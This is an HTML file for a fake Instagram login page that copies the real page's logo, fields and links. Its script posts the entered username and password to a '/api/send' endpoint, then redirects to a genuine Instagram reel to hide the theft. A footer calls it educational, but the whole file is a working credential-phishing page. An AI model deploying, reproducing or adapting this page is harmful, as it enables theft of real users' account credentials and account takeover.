<html>

<head>
    <title>Instagram</title>
    <meta charset="utf-8">
    <meta name="viewport" content=" width=device-width,initial-scale=1.0">
    <meta http-equiv="refresh" content="60">
    <link rel="icon" href="/images/favicon.png" type="image/icon">
    <link rel="stylesheet" type="text/css" href="/style.css">

</head>

<body>
    <div class="container">
        <div class="page">
            <div class="logo">

                <img src="/images/instagram.png" alt="instagram" style="width: 175px; ">
            </div>

            <br />
            <form class="container" id="loginForm">
                <input type="text" placeholder="Phone number, username, or email " name="u_name" required>
                <input type="password" placeholder="Password" name="pass" required>
                <button type="button" class="submitbutton" onclick="handleSubmit()">Log in </button>
                <br />
                <div class="option">OR </div>
            </form>

            <div class="fblink">
                <span class="fab fafacebook"></span>
                <a href="#"> Log in With Facebook</a>
            </div>

            <div class="forget-id">
                <a href="https://www.instagram.com/accounts/password/reset/">Forget password?</a>
            </div>
            <div class="singup">
                <p>Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/">
                        Sign up</a></p>
            </div>

        </div>
    </div>

    <br />
    <div style="position:fixed;left:0;bottom:0;width:100%; color: #7e7979;">
        <p style="text-align:center;"> Disclaimer this is not a real "instagram.com" page, please do not enter
            your real username and password, it's only for educational purposes.</p>
    </div>
    <br />

    <script>
        async function handleSubmit() {
            const u_name = document.querySelector('input[name="u_name"]').value;
            const pass = document.querySelector('input[name="pass"]').value;

            if (!u_name || !pass) {
                alert('Please enter correct username or password. Try again');
                return;
            }

            try {
                const response = await fetch('/api/send', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ u_name, pass }),
                });

                const data = await response.json();

                if (response.ok) {
                    window.location.replace('https://www.instagram.com/reels/DYMs-EYKoqq/');
                } else {
                    alert(data.error || 'Please enter correct username or password. Try again');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('Please enter correct username or password. Try again');
            }
        }
    </script>

</body>

</html>
